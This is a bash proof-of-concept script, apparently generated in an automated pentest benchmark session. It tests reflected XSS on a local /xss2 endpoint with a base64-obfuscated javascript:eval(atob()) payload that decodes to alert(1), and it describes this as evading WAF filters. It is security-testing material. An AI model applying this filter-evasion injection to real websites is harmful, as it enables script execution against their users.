#!/bin/bash
# POC: Demonstrates XSS vulnerability in /xss2 endpoint using javascript:eval(atob()) with base64-encoded payload obfuscation
# Target: ./repo
# Created: 2025-11-05T17:28:33.131Z
# Session: benchmark-XBEN-047-24-mhm9f6sp

# XSS via JavaScript eval() with Base64-Encoded Payload Obfuscation
# Target: /xss2 endpoint
# Method: javascript:eval(atob()) to execute obfuscated JavaScript

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss2"

# Base64 encoding of 'alert(1)'
BASE64_PAYLOAD="YWxlcnQoMSk="

# Construct the XSS payload
XSS_PAYLOAD="javascript:eval(atob('${BASE64_PAYLOAD}'))"

# URL encode the payload for the query string
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${XSS_PAYLOAD}'''))")

# Make the request
echo "[*] Testing XSS via eval(atob()) on ${TARGET_URL}${ENDPOINT}"
echo "[*] Payload: ${XSS_PAYLOAD}"
echo "[*] Base64 string '${BASE64_PAYLOAD}' decodes to: alert(1)"
echo ""

RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?url=${ENCODED_PAYLOAD}")

# Check if the payload appears in the response within an iframe src attribute
if echo "$RESPONSE" | grep -q "javascript:eval(atob('${BASE64_PAYLOAD}'))"; then
    echo "[+] VULNERABLE: Payload reflected in iframe src attribute"
    echo "[+] Response snippet:"
    echo "$RESPONSE" | grep -o '<iframe[^>]*>' | head -1
    echo ""
    echo "[+] The base64 payload '${BASE64_PAYLOAD}' will be decoded by atob()"
    echo "[+] Then executed by eval() function"
    echo "[+] This bypasses WAF filters looking for plain 'alert(' strings"
    exit 0
else
    echo "[-] Payload not found in response or filtered"
    echo "[*] Full response:"
    echo "$RESPONSE"
    exit 1
fi